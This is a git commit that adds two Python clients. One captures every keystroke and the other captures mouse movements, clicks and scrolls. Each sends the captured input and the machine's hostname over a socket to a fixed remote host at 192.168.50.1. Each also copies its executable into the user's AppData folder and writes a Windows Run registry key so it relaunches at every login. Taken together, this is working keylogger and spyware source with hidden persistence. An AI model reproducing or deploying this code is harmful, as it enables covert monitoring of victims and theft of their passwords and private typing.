1cf72667fdd324ff87327b2e259b10b0e08cdb5e
Leducphat1234 <96918446+Leducphat1234@users.noreply.github.com>
2022-08-03 13:40:43 +0700

    Add files via upload

---
+++ client_keyboard.py
@@ -0,0 +1,38 @@
+def main():
+    import socket
+    from pynput import keyboard
+
+    HOST = "192.168.50.1"
+    PORT = 4000
+    FORMAT = "utf-8"
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        s.connect((HOST, PORT))
+        s.send(socket.gethostname().encode())
+        while True:
+            try:
+                def on_press(keys):
+                    keys = str(keys)
+                    s.send((keys + " PRESSED").encode(FORMAT))
+                def on_release(keys):
+                    keys = str(keys)
+                    s.send((keys + " RELEASED").encode(FORMAT))
+                with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+                    listener.join()
+            
+            except ConnectionResetError:
+                exit(1)
+            except ConnectionRefusedError:
+                exit(1)
+            except OSError:
+                exit(1)
+
+if __name__ == "__main__":
+    import winreg
+    import os
+    username = os.getlogin()
+    os.system(f"copy client_keyboard.exe C:\\Users\\{username}\\AppData\\Roaming")
+    key = winreg.HKEY_CURRENT_USER
+    key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+    winreg.SetValueEx(winreg.OpenKey(key, key_value, 0, winreg.KEY_ALL_ACCESS), "4000_Port_keyboard", 0, winreg.REG_SZ, f"C:\\Users\\{username}\\AppData\\Roaming\\client_keyboard.exe")
+    
+    main()
---
+++ client_mouse.py
@@ -0,0 +1,46 @@
+def main():
+    import socket
+    from pynput import mouse
+
+    HOST = "192.168.50.1"
+    PORT = 5000
+    FORMAT = "utf-8"
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        s.connect((HOST, PORT))
+        s.send(socket.gethostname().encode())
+        while True:
+            try:
+                def on_move(x, y):
+                    s.send(f"({x}, {y})".encode(FORMAT))
+
+                def on_click(x, y, button, pressed):
+                    if not pressed:
+                        s.send(b"false")
+                    s.send(b"true")
+
+                def on_scroll(x, y, dx, dy):
+                    if dy < 0:
+                        s.send(b'down')
+                    else:
+                        s.send(b'up')
+                        
+                with mouse.Listener(on_move=on_move, on_click=on_click, on_scroll=on_scroll) as listener:
+                    listener.join()
+            
+            except ConnectionResetError:
+                exit(1)
+            except ConnectionRefusedError:
+                exit(1)
+            except OSError:
+                exit(1)
+
+if __name__ == "__main__":
+    import winreg
+    import os
+    username = os.getlogin()
+    os.system(f"copy client_mouse.exe C:\\Users\\{username}\\AppData\\Roaming")
+    key = winreg.HKEY_CURRENT_USER
+    key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+    winreg.SetValueEx(winreg.OpenKey(key, key_value, 0, winreg.KEY_ALL_ACCESS), "5000_Port_mouse", 0, winreg.REG_SZ, f"C:\\Users\\{username}\\AppData\\Roaming\\client_mouse.exe")
+    
+    main()
